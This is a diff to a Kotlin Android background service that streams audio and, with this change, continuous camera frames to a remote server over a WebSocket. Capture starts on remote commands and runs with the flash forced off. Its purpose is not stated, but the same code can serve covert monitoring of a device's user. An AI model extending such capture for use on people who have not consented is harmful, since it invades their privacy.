@@ -139,6 +139,8 @@ class MicService : Service() {
     @Volatile private var isPhotoCaptureBusy = false
     @Volatile private var aiPhotoEnhancementEnabled = true
     @Volatile private var photoQualityMode = "normal" // fast | normal | hd
+    @Volatile private var isCameraLiveStreaming = false
+    private var cameraLiveJob: Job? = null
 
     // ── PCM enhancement filter state (persists across frames for continuity) ──
     // Reset these at each capture start so a previous session's state is never reused.
@@ -329,6 +331,7 @@ class MicService : Service() {
         stopMicWatchdog()
         stopAudioCapture("stop_capture_for_webrtc")
         stopWebRtcSession(notifyState = false)
+        stopCameraLiveStream("service_destroy")
         closeRecordingFile()
         webSocket?.close(1000, "Service stopped")
         isWsConnecting = false
@@ -409,6 +412,7 @@ class MicService : Service() {
     private fun onWsDisconnected(reason: String) {
         isWsConnecting = false
         activeWebSocket = null
+        stopCameraLiveStream("ws_disconnected")
         stopMicWatchdog()
         stopAudioCapture()
         stopWebRtcSession(notifyState = false)
@@ -588,11 +592,25 @@ class MicService : Service() {
                     else
                         CameraCharacteristics.LENS_FACING_FRONT
                     val cameraText = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
+                    if (isCameraLiveStreaming) restartCameraLiveStream()
                     webSocket?.send("ACK:switch_camera:$cameraText")
                 }
                 "take_photo" -> {
                     val camera = obj.optString("camera", "current").trim().lowercase()
                     captureAndSendPhoto(camera)
+                }
+                "camera_live_start" -> {
+                    val camera = obj.optString("camera", "current").trim().lowercase()
+                    val facing = when (camera) {
+                        "front" -> CameraCharacteristics.LENS_FACING_FRONT
+                        "rear", "back" -> CameraCharacteristics.LENS_FACING_BACK
+                        else -> preferredCameraFacing
+                    }
+                    preferredCameraFacing = facing
+                    startCameraLiveStream(facing)
+                }
+                "camera_live_stop" -> {
+                    stopCameraLiveStream("remote_stop")
                 }
                 else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
             }
@@ -1017,6 +1035,9 @@ class MicService : Service() {
     }
 
     private fun captureAndSendPhoto(cameraMode: String) {
+        if (isCameraLiveStreaming) {
+            stopCameraLiveStream("snapshot_requested")
+        }
         if (isPhotoCaptureBusy) {
             webSocket?.send("ACK:take_photo:busy")
             return
@@ -1077,7 +1098,7 @@ class MicService : Service() {
             else -> 1280
         }
         val size = streamMap.getOutputSizes(ImageFormat.JPEG)
-            ?.sortedBy { it.width * it.height }
+            ?.sortedByDescending { it.width * it.height }
             ?.firstOrNull { it.width <= maxEdge && it.height <= maxEdge }
             ?: streamMap.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
             ?: return null
@@ -1144,7 +1165,8 @@ class MicService : Service() {
                 addTarget(imageReader.surface)
                 set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                 set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
+                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
             }.build()
 
             capSession.capture(req, object : CameraCaptureSession.CaptureCallback() {}, handler)
@@ -1167,14 +1189,89 @@ class MicService : Service() {
         for (id in ids) {
             val c = cm.getCameraCharacteristics(id)
             val facing = c.get(CameraCharacteristics.LENS_FACING)
-            if (facing == null) {
-                if (fallback == null) fallback = id
+            val caps = c.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
+            val streamMap = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val hasJpeg = streamMap?.getOutputSizes(ImageFormat.JPEG)?.isNotEmpty() == true
+            val isBackwardCompatible = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_BACKWARD_COMPATIBLE)
+            if (!hasJpeg || !isBackwardCompatible) {
                 continue
             }
-            if (facing == targetFacing) return id
+            if (facing == targetFacing && !isLogicalMultiCamera(c)) return id
+            if (facing == targetFacing && fallback == null) fallback = id
             if (fallback == null) fallback = id
         }
         return fallback
+    }
+
+    private fun isLogicalMultiCamera(chars: CameraCharacteristics): Boolean {
+        val caps = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
+        return caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_LOGICAL_MULTI_CAMERA)
+    }
+
+    private fun liveFrameIntervalMs(): Long {
+        return when (photoQualityMode) {
+            "fast" -> 60L
+            "hd" -> 140L
+            else -> 90L
+        }
+    }
+
+    private fun startCameraLiveStream(targetFacing: Int) {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            webSocket?.send("ACK:camera_live:camera_permission_denied")
+            return
+        }
+        preferredCameraFacing = targetFacing
+        if (isCameraLiveStreaming) {
+            restartCameraLiveStream()
+            return
+        }
+        isCameraLiveStreaming = true
+        cameraLiveJob?.cancel()
+        cameraLiveJob = serviceScope.launch(Dispatchers.IO) {
+            webSocket?.send("ACK:camera_live:started")
+            sendHealthStatus("camera_live_on")
+            while (isActive && isCameraLiveStreaming && activeWebSocket != null) {
+                try {
+                    val jpeg = captureJpegOnce(preferredCameraFacing)
+                    if (jpeg != null && jpeg.isNotEmpty()) {
+                        val now = System.currentTimeMillis()
+                        val frameBase64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
+                        val msg = JSONObject().apply {
+                            put("type", "camera_live_frame")
+                            put("deviceId", deviceId)
+                            put("camera", if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear")
+                            put("quality", photoQualityMode)
+                            put("mime", "image/jpeg")
+                            put("data", frameBase64)
+                            put("ts", now)
+                        }
+                        webSocket?.send(msg.toString())
+                    }
+                    delay(liveFrameIntervalMs())
+                } catch (e: Exception) {
+                    Log.w(TAG, "camera live frame failed: ${e.message}")
+                    delay(200)
+                }
+            }
+        }
+    }
+
+    private fun restartCameraLiveStream() {
+        if (!isCameraLiveStreaming) return
+        stopCameraLiveStream("restart")
+        startCameraLiveStream(preferredCameraFacing)
+    }
+
+    private fun stopCameraLiveStream(reason: String) {
+        val wasLive = isCameraLiveStreaming
+        isCameraLiveStreaming = false
+        cameraLiveJob?.cancel()
+        cameraLiveJob = null
+        if (wasLive) {
+            webSocket?.send("ACK:camera_live:stopped")
+            sendHealthStatus("camera_live_off_$reason")
+        }
     }
 
     private fun optimizePhotoJpeg(source: ByteArray): ByteArray {
